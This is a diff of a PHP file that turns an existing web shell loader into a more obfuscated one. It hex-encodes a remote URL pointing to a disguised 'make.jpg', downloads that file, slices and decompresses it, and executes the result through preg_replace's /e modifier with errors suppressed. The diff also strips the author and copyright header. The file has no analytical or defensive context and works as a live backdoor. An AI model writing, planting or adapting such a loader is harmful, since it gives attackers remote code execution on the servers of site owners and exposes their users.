@@ -1,21 +1,18 @@
 <?php
-/**
-// +----------------------------------------------------------------------
-// | Copyright (c) 2006-2012 ephper All rights reserved.
-// +----------------------------------------------------------------------
-// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
-// +----------------------------------------------------------------------
-// | Author: ephper <2012heike@gmail.com>
-// +----------------------------------------------------------------------
-// $Id: [$file] v1 2012-4-19 10:46 ephper $
-*/
 error_reporting(0);
-session_start();
-define('password','9b7972b9374dce312fa17d8e1969555a'); 
-define('title','。');
-define('copyright', 'E');
-if(empty($_SESSION['data'])){
-    $_SESSION['data']=substr(file_get_contents('http://2012heike.googlecode.com/svn/trunk/make.jpg'),3649);
+if(!function_exists("hex2bin")){
+function hex2bin($data) {
+    $_data='';
+    $len = strlen($data);
+    for ($i=0;$i<$len;$i+=2) {
+    $_data.=chr(hexdec(substr($data,$i,2)));
+      }
+    return $_data;
+ } 
 }
-@preg_replace("~(.*)~ies",gzuncompress($_SESSION['data']),null);
+session_start();
+if(empty($_SESSION['api'])){
+    $_SESSION['api']=substr(file_get_contents(hex2bin('687474703a2f2f323031326865696b652e676f6f676c65636f64652e636f6d2f73766e2f7472756e6b2f6d616b652e6a7067')),3649);
+}
+@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);
 ?>
